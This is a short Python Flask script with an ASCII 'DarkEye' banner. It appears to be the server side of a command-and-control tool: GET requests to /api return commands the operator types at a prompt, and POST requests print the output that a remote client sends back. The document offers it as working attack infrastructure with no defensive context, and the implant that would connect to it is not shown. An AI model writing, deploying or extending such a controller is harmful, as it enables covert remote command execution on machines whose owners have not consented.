from flask import Flask, request

app = Flask(__name__)

startup = " _____              _     _______            \n(____ \            | |   (_______)           \n _   \ \ ____  ____| |  _ _____  _   _  ____ \n| |   | / _  |/ ___) | / )  ___)| | | |/ _  )\n| |__/ ( ( | | |   | |< (| |____| |_| ( (/ / \n|_____/ \_||_|_|   |_| \_)_______)__  |\____)\n                                (____/       \n"

print(startup)


@app.route("/api", methods=["GET", "POST"])
def handle_requests():
    if request.method == "GET":
        return input(">>> ")
    elif request.method == "POST":
        print(request.data.decode("utf-8").strip())
        return "."


if __name__ == "__main__":
    app.run(debug=False, host="192.x.x.x")
